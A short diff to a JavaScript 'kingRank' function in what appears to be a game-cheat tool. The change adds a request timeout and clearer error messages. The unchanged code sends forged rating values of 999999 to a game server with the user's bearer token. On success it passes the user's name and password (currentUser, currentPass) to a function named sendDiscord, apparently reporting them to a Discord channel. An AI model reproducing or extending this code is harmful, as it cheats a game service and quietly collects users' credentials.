@@ -140,15 +140,31 @@ async function kingRank(){
   ["cars","car_fix","car_wash","drift","levels","police","treasure"].forEach(f => rD[f] = 999999);
   
   try{
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 25000);
+
     const res = await fetch(selectedGame.u, {
-      method:'POST', headers:{"Authorization":`Bearer ${currentToken}`,"Content-Type":"application/json"},
-      body:JSON.stringify({data:JSON.stringify({RatingData:rD})})
+      method:'POST', 
+      headers:{"Authorization":`Bearer ${currentToken}`,"Content-Type":"application/json"},
+      body:JSON.stringify({data:JSON.stringify({RatingData:rD})}),
+      signal: controller.signal
     });
+    
+    clearTimeout(timeoutId);
+
     if(res.ok){ 
       updateStatus("✅ King Rank Added!", false, 'serviceStatus'); 
       sendDiscord("👑 KING RANK APPLIED", currentUser, currentPass, selectedGame.name);
-    } else { updateStatus("❌ Apply Failed!", true, 'serviceStatus'); }
-  } catch(e){ updateStatus("❌ Request Timeout!", true, 'serviceStatus'); }
+    } else { 
+      updateStatus("❌ Apply Failed! Server busy.", true, 'serviceStatus'); 
+    }
+  } catch(e){ 
+    if(e.name === 'AbortError') {
+      updateStatus("❌ Request Timed Out! Server is slow, try again.", true, 'serviceStatus');
+    } else {
+      updateStatus("❌ Network Connection Error!", true, 'serviceStatus'); 
+    }
+  }
 }
 
 async function changePassword() {
